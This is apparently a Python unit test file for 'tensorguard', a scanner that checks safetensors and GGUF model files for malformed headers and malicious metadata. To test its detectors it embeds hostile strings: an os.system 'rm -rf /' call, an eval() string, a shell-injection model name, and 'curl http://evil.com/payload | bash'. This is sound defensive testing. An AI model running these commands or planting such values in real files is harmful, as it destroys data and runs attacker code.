#!/usr/bin/env python3
"""Tests for tensorguard."""

import json
import os
import struct
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(__file__))
import tensorguard


class TestSafetensorsParser(unittest.TestCase):
    """Test safetensors file parsing."""

    def _create_safetensors(self, header: dict, data: bytes = b"") -> str:
        """Create a minimal safetensors file."""
        header_json = json.dumps(header).encode("utf-8")
        header_size = struct.pack("<Q", len(header_json))
        fd, path = tempfile.mkstemp(suffix=".safetensors")
        with os.fdopen(fd, "wb") as f:
            f.write(header_size)
            f.write(header_json)
            f.write(data)
        return path

    def test_empty_model(self):
        """Parse a safetensors file with no tensors."""
        path = self._create_safetensors({})
        try:
            info = tensorguard.parse_safetensors(path)
            self.assertEqual(info.format, "safetensors")
            self.assertEqual(len(info.tensors), 0)
            self.assertEqual(len(info.metadata), 0)
        finally:
            os.unlink(path)

    def test_single_tensor(self):
        """Parse a safetensors file with one tensor."""
        # 4 floats = 16 bytes
        header = {
            "weight": {
                "dtype": "F32",
                "shape": [2, 2],
                "data_offsets": [0, 16],
            }
        }
        data = b"\x00" * 16
        path = self._create_safetensors(header, data)
        try:
            info = tensorguard.parse_safetensors(path)
            self.assertEqual(len(info.tensors), 1)
            self.assertEqual(info.tensors[0].name, "weight")
            self.assertEqual(info.tensors[0].dtype, "F32")
            self.assertEqual(info.tensors[0].shape, [2, 2])
            self.assertEqual(info.tensors[0].num_elements, 4)
            self.assertEqual(info.tensors[0].size_bytes, 16)
        finally:
            os.unlink(path)

    def test_multiple_tensors(self):
        """Parse a safetensors file with multiple tensors."""
        header = {
            "layer.0.weight": {
                "dtype": "F16",
                "shape": [768, 768],
                "data_offsets": [0, 1179648],
            },
            "layer.0.bias": {
                "dtype": "F16",
                "shape": [768],
                "data_offsets": [1179648, 1181184],
            },
        }
        data = b"\x00" * 1181184
        path = self._create_safetensors(header, data)
        try:
            info = tensorguard.parse_safetensors(path)
            self.assertEqual(len(info.tensors), 2)
            total_params = sum(t.num_elements for t in info.tensors)
            self.assertEqual(total_params, 768 * 768 + 768)
        finally:
            os.unlink(path)

    def test_metadata(self):
        """Parse safetensors metadata."""
        header = {
            "__metadata__": {
                "format": "pt",
                "source": "huggingface",
            },
            "weight": {
                "dtype": "F32",
                "shape": [4],
                "data_offsets": [0, 16],
            },
        }
        data = b"\x00" * 16
        path = self._create_safetensors(header, data)
        try:
            info = tensorguard.parse_safetensors(path)
            self.assertEqual(info.metadata["format"], "pt")
            self.assertEqual(info.metadata["source"], "huggingface")
            self.assertEqual(len(info.tensors), 1)
        finally:
            os.unlink(path)

    def test_truncated_file(self):
        """Detect truncated file."""
        fd, path = tempfile.mkstemp(suffix=".safetensors")
        with os.fdopen(fd, "wb") as f:
            f.write(b"\x00\x00")  # Only 2 bytes
        try:
            info = tensorguard.parse_safetensors(path)
            critical = [f for f in info.findings if f.severity == "critical"]
            self.assertTrue(len(critical) > 0)
        finally:
            os.unlink(path)

    def test_header_too_large(self):
        """Detect header larger than file."""
        fd, path = tempfile.mkstemp(suffix=".safetensors")
        with os.fdopen(fd, "wb") as f:
            f.write(struct.pack("<Q", 999999999))  # Claim huge header
            f.write(b"{}")  # Tiny actual content
        try:
            info = tensorguard.parse_safetensors(path)
            critical = [f for f in info.findings if f.severity == "critical"]
            self.assertTrue(len(critical) > 0)
        finally:
            os.unlink(path)

    def test_invalid_json(self):
        """Detect invalid JSON header."""
        fd, path = tempfile.mkstemp(suffix=".safetensors")
        bad_json = b"not json at all"
        with os.fdopen(fd, "wb") as f:
            f.write(struct.pack("<Q", len(bad_json)))
            f.write(bad_json)
        try:
            info = tensorguard.parse_safetensors(path)
            critical = [f for f in info.findings if f.severity == "critical"]
            self.assertTrue(len(critical) > 0)
        finally:
            os.unlink(path)

    def test_overlapping_tensors(self):
        """Detect overlapping tensor data regions."""
        header = {
            "a": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
            "b": {"dtype": "F32", "shape": [4], "data_offsets": [8, 24]},  # Overlaps!
        }
        data = b"\x00" * 24
        path = self._create_safetensors(header, data)
        try:
            info = tensorguard.parse_safetensors(path)
            overlap = [f for f in info.findings if f.rule == "TG05"]
            self.assertTrue(len(overlap) > 0)
        finally:
            os.unlink(path)

    def test_tensor_beyond_file(self):
        """Detect tensor extending beyond file."""
        header = {
            "weight": {"dtype": "F32", "shape": [1000], "data_offsets": [0, 4000]},
        }
        data = b"\x00" * 16  # Much less than 4000
        path = self._create_safetensors(header, data)
        try:
            info = tensorguard.parse_safetensors(path)
            beyond = [f for f in info.findings if f.rule == "TG06"]
            self.assertTrue(len(beyond) > 0)
        finally:
            os.unlink(path)


class TestSecurityChecks(unittest.TestCase):
    """Test security detection rules."""

    def _create_safetensors_with_metadata(self, metadata: dict) -> str:
        """Create a safetensors file with specific metadata."""
        header = {
            "__metadata__": metadata,
            "weight": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
        }
        header_json = json.dumps(header).encode("utf-8")
        header_size = struct.pack("<Q", len(header_json))
        fd, path = tempfile.mkstemp(suffix=".safetensors")
        with os.fdopen(fd, "wb") as f:
            f.write(header_size)
            f.write(header_json)
            f.write(b"\x00" * 16)
        return path

    def test_code_in_metadata(self):
        """Detect code execution patterns in metadata."""
        path = self._create_safetensors_with_metadata({
            "config": "__import__('os').system('rm -rf /')",
        })
        try:
            info = tensorguard.parse_safetensors(path)
            critical = [f for f in info.findings if f.rule == "TG12"]
            self.assertTrue(len(critical) > 0, "Should detect code pattern in metadata")
        finally:
            os.unlink(path)

    def test_eval_in_metadata(self):
        """Detect eval() in metadata."""
        path = self._create_safetensors_with_metadata({
            "processor": "eval(config['code'])",
        })
        try:
            info = tensorguard.parse_safetensors(path)
            critical = [f for f in info.findings if f.rule == "TG12"]
            self.assertTrue(len(critical) > 0)
        finally:
            os.unlink(path)

    def test_trust_remote_code(self):
        """Detect trust_remote_code reference."""
        path = self._create_safetensors_with_metadata({
            "note": "Set trust_remote_code=True to load",
        })
        try:
            info = tensorguard.parse_safetensors(path)
            trc = [f for f in info.findings if f.rule == "TG12"]
            self.assertTrue(len(trc) > 0)
        finally:
            os.unlink(path)

    def test_base64_payload(self):
        """Detect possible base64 encoded payload."""
        import base64
        payload = base64.b64encode(b"A" * 200).decode()
        path = self._create_safetensors_with_metadata({
            "hidden": payload,
        })
        try:
            info = tensorguard.parse_safetensors(path)
            b64 = [f for f in info.findings if f.rule == "TG13"]
            self.assertTrue(len(b64) > 0, "Should detect base64 payload")
        finally:
            os.unlink(path)

    def test_underscore_metadata_key(self):
        """Detect underscore-prefixed metadata keys."""
        path = self._create_safetensors_with_metadata({
            "_internal_config": "something",
        })
        try:
            info = tensorguard.parse_safetensors(path)
            underscore = [f for f in info.findings if f.rule == "TG11"]
            self.assertTrue(len(underscore) > 0)
        finally:
            os.unlink(path)

    def test_suspicious_tensor_name(self):
        """Detect suspicious tensor names."""
        header = {
            "backdoor_weight": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
        }
        header_json = json.dumps(header).encode("utf-8")
        fd, path = tempfile.mkstemp(suffix=".safetensors")
        with os.fdopen(fd, "wb") as f:
            f.write(struct.pack("<Q", len(header_json)))
            f.write(header_json)
            f.write(b"\x00" * 16)
        try:
            info = tensorguard.parse_safetensors(path)
            suspicious = [f for f in info.findings if f.rule == "TG16"]
            self.assertTrue(len(suspicious) > 0)
        finally:
            os.unlink(path)

    def test_clean_model(self):
        """Verify clean model gets good grade."""
        header = {
            "__metadata__": {"format": "pt"},
            "model.weight": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
            "model.bias": {"dtype": "F32", "shape": [4], "data_offsets": [16, 32]},
        }
        header_json = json.dumps(header).encode("utf-8")
        fd, path = tempfile.mkstemp(suffix=".safetensors")
        with os.fdopen(fd, "wb") as f:
            f.write(struct.pack("<Q", len(header_json)))
            f.write(header_json)
            f.write(b"\x00" * 32)
        try:
            info = tensorguard.parse_safetensors(path)
            grade, score = tensorguard.calculate_grade(info.findings)
            self.assertIn(grade, ["A", "B"])
        finally:
            os.unlink(path)


class TestGGUFParser(unittest.TestCase):
    """Test GGUF file parsing."""

    def _create_gguf(self, version: int = 3, kv_pairs: list = None,
                     tensor_count: int = 0) -> str:
        """Create a minimal GGUF file."""
        fd, path = tempfile.mkstemp(suffix=".gguf")
        kv_pairs = kv_pairs or []
        with os.fdopen(fd, "wb") as f:
            f.write(b"GGUF")                              # magic
            f.write(struct.pack("<I", version))            # version
            f.write(struct.pack("<Q", tensor_count))       # tensor count
            f.write(struct.pack("<Q", len(kv_pairs)))      # kv count

            for key, value_type, value in kv_pairs:
                key_bytes = key.encode("utf-8")
                f.write(struct.pack("<Q", len(key_bytes)))
                f.write(key_bytes)
                f.write(struct.pack("<I", value_type))

                if value_type == 8:  # STRING
                    val_bytes = value.encode("utf-8")
                    f.write(struct.pack("<Q", len(val_bytes)))
                    f.write(val_bytes)
                elif value_type == 4:  # UINT32
                    f.write(struct.pack("<I", value))
                elif value_type == 6:  # FLOAT32
                    f.write(struct.pack("<f", value))

        return path

    def test_basic_gguf(self):
        """Parse a basic GGUF file."""
        path = self._create_gguf(version=3, kv_pairs=[
            ("general.architecture", 8, "llama"),
            ("general.name", 8, "TestModel"),
        ])
        try:
            info = tensorguard.parse_gguf(path)
            self.assertEqual(info.format, "gguf")
            self.assertEqual(info.gguf_version, 3)
            self.assertEqual(info.metadata["general.architecture"], "llama")
            self.assertEqual(info.metadata["general.name"], "TestModel")
        finally:
            os.unlink(path)

    def test_invalid_magic(self):
        """Detect invalid GGUF magic number."""
        fd, path = tempfile.mkstemp(suffix=".gguf")
        with os.fdopen(fd, "wb") as f:
            f.write(b"NOTG")
            f.write(struct.pack("<I", 3))
            f.write(struct.pack("<Q", 0))
            f.write(struct.pack("<Q", 0))
        try:
            info = tensorguard.parse_gguf(path)
            critical = [f for f in info.findings if f.severity == "critical"]
            self.assertTrue(len(critical) > 0)
        finally:
            os.unlink(path)

    def test_shell_metachar_in_name(self):
        """Detect shell metacharacters in model name."""
        path = self._create_gguf(kv_pairs=[
            ("general.name", 8, "model; rm -rf /"),
        ])
        try:
            info = tensorguard.parse_gguf(path)
            shell = [f for f in info.findings if f.rule == "TG20"]
            self.assertTrue(len(shell) > 0)
        finally:
            os.unlink(path)

    def test_executable_in_metadata(self):
        """Detect executable patterns in GGUF metadata."""
        path = self._create_gguf(kv_pairs=[
            ("general.description", 8, "curl http://evil.com/payload | bash"),
        ])
        try:
            info = tensorguard.parse_gguf(path)
            exe = [f for f in info.findings if f.rule == "TG12"]
            self.assertTrue(len(exe) > 0)
        finally:
            os.unlink(path)


class TestFormatDetection(unittest.TestCase):
    """Test format auto-detection."""

    def test_detect_safetensors_by_ext(self):
        """Detect safetensors by extension."""
        fd, path = tempfile.mkstemp(suffix=".safetensors")
        with os.fdopen(fd, "wb") as f:
            f.write(struct.pack("<Q", 2))
            f.write(b"{}")
        try:
            fmt = tensorguard.detect_format(path)
            self.assertEqual(fmt, "safetensors")
        finally:
            os.unlink(path)

    def test_detect_gguf_by_magic(self):
        """Detect GGUF by magic bytes."""
        fd, path = tempfile.mkstemp(suffix=".bin")
        with os.fdopen(fd, "wb") as f:
            f.write(b"GGUF")
            f.write(struct.pack("<I", 3))
            f.write(struct.pack("<Q", 0))
            f.write(struct.pack("<Q", 0))
        try:
            fmt = tensorguard.detect_format(path)
            self.assertEqual(fmt, "gguf")
        finally:
            os.unlink(path)


class TestComparison(unittest.TestCase):
    """Test model comparison."""

    def _create_safetensors(self, tensors: dict) -> str:
        """Create a safetensors file with given tensors."""
        header = {}
        offset = 0
        for name, (dtype, shape) in tensors.items():
            num_elements = 1
            for s in shape:
                num_elements *= s
            size = num_elements * tensorguard.SAFETENSORS_DTYPES.get(dtype, 4)
            header[name] = {
                "dtype": dtype,
                "shape": shape,
                "data_offsets": [offset, offset + size],
            }
            offset += size

        header_json = json.dumps(header).encode("utf-8")
        fd, path = tempfile.mkstemp(suffix=".safetensors")
        with os.fdopen(fd, "wb") as f:
            f.write(struct.pack("<Q", len(header_json)))
            f.write(header_json)
            f.write(b"\x00" * offset)
        return path

    def test_identical_models(self):
        """Compare identical models."""
        tensors = {"weight": ("F32", [4, 4]), "bias": ("F32", [4])}
        path_a = self._create_safetensors(tensors)
        path_b = self._create_safetensors(tensors)
        try:
            info_a = tensorguard.parse_safetensors(path_a)
            info_b = tensorguard.parse_safetensors(path_b)
            diff = tensorguard.compare_models(info_a, info_b)
            self.assertEqual(diff["summary"]["added"], 0)
            self.assertEqual(diff["summary"]["removed"], 0)
            self.assertEqual(diff["summary"]["changed"], 0)
            self.assertEqual(diff["summary"]["unchanged"], 2)
        finally:
            os.unlink(path_a)
            os.unlink(path_b)

    def test_added_tensors(self):
        """Detect added tensors."""
        path_a = self._create_safetensors({"weight": ("F32", [4])})
        path_b = self._create_safetensors({
            "weight": ("F32", [4]),
            "bias": ("F32", [4]),
        })
        try:
            info_a = tensorguard.parse_safetensors(path_a)
            info_b = tensorguard.parse_safetensors(path_b)
            diff = tensorguard.compare_models(info_a, info_b)
            self.assertEqual(diff["summary"]["added"], 1)
            self.assertIn("bias", diff["tensors_added"])
        finally:
            os.unlink(path_a)
            os.unlink(path_b)

    def test_removed_tensors(self):
        """Detect removed tensors."""
        path_a = self._create_safetensors({
            "weight": ("F32", [4]),
            "bias": ("F32", [4]),
        })
        path_b = self._create_safetensors({"weight": ("F32", [4])})
        try:
            info_a = tensorguard.parse_safetensors(path_a)
            info_b = tensorguard.parse_safetensors(path_b)
            diff = tensorguard.compare_models(info_a, info_b)
            self.assertEqual(diff["summary"]["removed"], 1)
            self.assertIn("bias", diff["tensors_removed"])
        finally:
            os.unlink(path_a)
            os.unlink(path_b)

    def test_changed_tensors(self):
        """Detect changed tensor dtypes/shapes."""
        path_a = self._create_safetensors({"weight": ("F32", [4, 4])})
        path_b = self._create_safetensors({"weight": ("F16", [8, 4])})
        try:
            info_a = tensorguard.parse_safetensors(path_a)
            info_b = tensorguard.parse_safetensors(path_b)
            diff = tensorguard.compare_models(info_a, info_b)
            self.assertEqual(diff["summary"]["changed"], 1)
            self.assertEqual(len(diff["tensors_changed"]), 1)
            change = diff["tensors_changed"][0]
            self.assertEqual(change["name"], "weight")
            self.assertEqual(len(change["changes"]), 2)  # dtype + shape
        finally:
            os.unlink(path_a)
            os.unlink(path_b)


class TestStatistics(unittest.TestCase):
    """Test model statistics computation."""

    def test_parameter_count(self):
        """Compute correct parameter count."""
        info = tensorguard.ModelInfo(path="test", format="safetensors")
        info.tensors = [
            tensorguard.TensorInfo(name="w1", dtype="F32", shape=[768, 768]),
            tensorguard.TensorInfo(name="b1", dtype="F32", shape=[768]),
            tensorguard.TensorInfo(name="w2", dtype="F16", shape=[768, 3072]),
        ]
        stats = tensorguard.compute_stats(info)
        expected = 768 * 768 + 768 + 768 * 3072
        self.assertEqual(stats["total_parameters"], expected)

    def test_dtype_distribution(self):
        """Compute dtype distribution."""
        info = tensorguard.ModelInfo(path="test", format="safetensors")
        info.tensors = [
            tensorguard.TensorInfo(name="w1", dtype="F32", shape=[4]),
            tensorguard.TensorInfo(name="w2", dtype="F32", shape=[4]),
            tensorguard.TensorInfo(name="w3", dtype="F16", shape=[4]),
        ]
        stats = tensorguard.compute_stats(info)
        self.assertEqual(stats["dtype_distribution"]["F32"], 2)
        self.assertEqual(stats["dtype_distribution"]["F16"], 1)


class TestScoring(unittest.TestCase):
    """Test grading system."""

    def test_no_findings(self):
        """No findings = grade A."""
        grade, score = tensorguard.calculate_grade([])
        self.assertEqual(grade, "A")
        self.assertEqual(score, 0)

    def test_critical_finding(self):
        """Critical finding = grade F."""
        findings = [tensorguard.Finding(
            severity="critical", rule="TEST", title="test", detail="test"
        )]
        grade, score = tensorguard.calculate_grade(findings)
        self.assertEqual(grade, "D")
        self.assertEqual(score, 25)

    def test_multiple_findings(self):
        """Multiple findings accumulate score."""
        findings = [
            tensorguard.Finding(severity="high", rule="T1", title="t", detail="d"),
            tensorguard.Finding(severity="high", rule="T2", title="t", detail="d"),
            tensorguard.Finding(severity="medium", rule="T3", title="t", detail="d"),
        ]
        grade, score = tensorguard.calculate_grade(findings)
        self.assertEqual(score, 23)  # 10 + 10 + 3


class TestHumanFormatting(unittest.TestCase):
    """Test human-readable formatting."""

    def test_human_size(self):
        """Format bytes."""
        self.assertEqual(tensorguard._human_size(0), "0 B")
        self.assertEqual(tensorguard._human_size(1024), "1.0 KB")
        self.assertEqual(tensorguard._human_size(1048576), "1.0 MB")
        self.assertEqual(tensorguard._human_size(1073741824), "1.0 GB")

    def test_human_count(self):
        """Format parameter counts."""
        self.assertEqual(tensorguard._human_count(42), "42")
        self.assertEqual(tensorguard._human_count(1500), "1.5K")
        self.assertEqual(tensorguard._human_count(7000000), "7.00M")
        self.assertEqual(tensorguard._human_count(70000000000), "70.00B")


class TestOutputFormats(unittest.TestCase):
    """Test output formatting."""

    def test_json_output(self):
        """JSON output is valid."""
        info = tensorguard.ModelInfo(path="test.safetensors", format="safetensors",
                                     file_size=100, header_size=50)
        info.tensors = [
            tensorguard.TensorInfo(name="w", dtype="F32", shape=[4],
                                   offset_start=0, offset_end=16),
        ]
        stats = tensorguard.compute_stats(info)
        output = tensorguard.format_json_output(info, stats)
        data = json.loads(output)
        self.assertEqual(data["format"], "safetensors")
        self.assertEqual(len(data["tensors"]), 1)
        self.assertIn("security", data)

    def test_text_output(self):
        """Text output contains expected sections."""
        info = tensorguard.ModelInfo(path="test.safetensors", format="safetensors",
                                     file_size=100, header_size=50)
        stats = tensorguard.compute_stats(info)
        output = tensorguard.format_inspect(info, stats, no_color=True)
        self.assertIn("tensorguard", output)
        self.assertIn("SECURITY", output)
        self.assertIn("FILE", output)


if __name__ == "__main__":
    unittest.main()
